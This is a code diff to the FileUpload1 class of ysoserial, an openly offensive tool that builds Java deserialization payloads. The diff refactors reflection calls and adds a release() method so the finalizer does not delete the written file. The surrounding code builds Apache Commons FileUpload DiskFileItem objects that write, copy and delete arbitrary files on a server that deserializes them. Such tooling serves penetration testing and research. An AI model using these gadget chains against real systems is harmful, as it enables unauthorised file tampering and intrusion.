@@ -4,7 +4,6 @@ package ysoserial.payloads;
 import java.io.File;
 import java.io.IOException;
 import java.io.OutputStream;
-import java.lang.reflect.Field;
 import java.util.Arrays;
 
 import org.apache.commons.codec.binary.Base64;
@@ -41,7 +40,7 @@ import ysoserial.payloads.util.Reflections;
     "commons-io:commons-io:2.4"
 } )
 @PayloadTest(harness="ysoserial.payloads.FileUploadTest")
-public class FileUpload1 implements ObjectPayload<DiskFileItem> {
+public class FileUpload1 implements ReleaseableObjectPayload<DiskFileItem> {
 
     /**
      * {@inheritDoc}
@@ -72,6 +71,17 @@ public class FileUpload1 implements ObjectPayload<DiskFileItem> {
         }
     }
 
+    /**
+      * {@inheritDoc}
+     * @throws Exception 
+      *
+      * @see ysoserial.payloads.ReleaseableObjectPayload#release(java.lang.Object)
+      */
+    public void release ( DiskFileItem obj ) throws Exception {
+        // otherwise the finalizer deletes the file
+        DeferredFileOutputStream dfos = new DeferredFileOutputStream(0, null);
+        Reflections.setFieldValue(obj, "dfos", dfos);
+    }
 
     private static DiskFileItem copyAndDelete ( String copyAndDelete, String copyTo ) throws IOException, Exception {
         return makePayload(0, copyTo, copyAndDelete, new byte[1]);
@@ -108,9 +118,7 @@ public class FileUpload1 implements ObjectPayload<DiskFileItem> {
         DeferredFileOutputStream dfos = new DeferredFileOutputStream(thresh, outputFile);
         OutputStream os = (OutputStream) Reflections.getFieldValue(dfos, "memoryOutputStream");
         os.write(data);
-        Field writtenF = ThresholdingOutputStream.class.getDeclaredField("written");
-        writtenF.setAccessible(true);
-        writtenF.set(dfos, data.length);
+        Reflections.getField(ThresholdingOutputStream.class, "written").set(dfos, data.length);
         Reflections.setFieldValue(diskFileItem, "dfos", dfos);
         Reflections.setFieldValue(diskFileItem, "sizeThreshold", 0);
         return diskFileItem;
